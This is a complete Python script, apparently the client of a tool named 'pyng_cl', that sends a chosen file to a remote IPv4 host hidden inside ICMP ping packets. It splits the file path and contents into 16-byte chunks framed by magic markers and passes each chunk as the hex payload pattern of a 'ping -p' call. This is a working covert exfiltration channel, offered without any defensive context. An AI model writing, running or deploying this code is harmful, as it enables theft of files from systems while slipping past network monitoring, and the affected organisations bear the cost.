#!/usr/bin/env python3

from asyncio.subprocess import DEVNULL
import ipaddress
import subprocess
import sys
from typing import List


CHUNK_SIZE = 16
NULL_BYTE = b'\0'


ERRORS = {
    'BIND': '[!]  Failed to bind on {}: {}',
    'CHUNK_SIZE': '[!]  Chunk with invalid size : {}',
    'FILE_READ': '[!]  File read error : {}',
    'INVALID_IPV4': '[!]  Invalid IPv4 address: {}',
    'USAGE': '[!]  USAGE: pyng_cl [SRV_IP] [FILE_PATH]',
}


MAGIC = {
    'mst': b'PYNGMETASTART',
    'men': b'PYNGMETAEND',
    'dst': b'PYNGDATASTART',
    'den': b'PYNGDATAEND',
}


def send(host: ipaddress.IPv4Address, chunk: bytes) -> None:
    if len(chunk) != CHUNK_SIZE:
        raise ValueError
    subprocess.run(['ping', '-c', '1', str(host), '-p', chunk.hex()], stdout=DEVNULL)


def lpad(start: bytes, size: int = CHUNK_SIZE, pad: bytes = NULL_BYTE) -> bytes:
    return start.ljust(size, pad)


def build_chunks(header: bytes, footer: bytes, data: bytes) -> List[bytes]:
    return [
        lpad(header),
        *(lpad(data[i:i+CHUNK_SIZE]) for i in range(0, len(data), CHUNK_SIZE)),
        lpad(footer)
    ]


def main() -> None:

    try:
        host, path = sys.argv[1:]
    except (ValueError, IndexError):
        sys.exit(ERRORS['USAGE'])

    try:
        host = ipaddress.IPv4Address(host)
    except ValueError:
        sys.exit(ERRORS['INVALID_IPV4'].format(host))

    try:
        with open(path, 'rb') as f:
            meta = build_chunks(MAGIC['mst'], MAGIC['men'], path.encode())
            data = build_chunks(MAGIC['dst'], MAGIC['den'], f.read())

            num_chunks = len(meta) + len(data)

            print(f'[+]  Transfer start\n[+]  File: {path}\n[+]  Chunks: {num_chunks}')

            for i, chunk in enumerate([*meta, *data], start = 1):
                print(f'[+]  Sent: {i} / {num_chunks}', end='\r' if i < num_chunks else '\n')
                try:
                    send(host, chunk)
                except ValueError:
                    sys.exit(ERRORS['CHUNK_SIZE'].format(chunk))
    except (
        PermissionError,
        FileNotFoundError,
        IsADirectoryError
    ) as e:
        sys.exit(ERRORS['FILE_READ'].format(e))


if __name__ == '__main__':
    try:
        main()
    except Exception as e:
        sys.exit(f'Unexpected fatal exception : {e}')
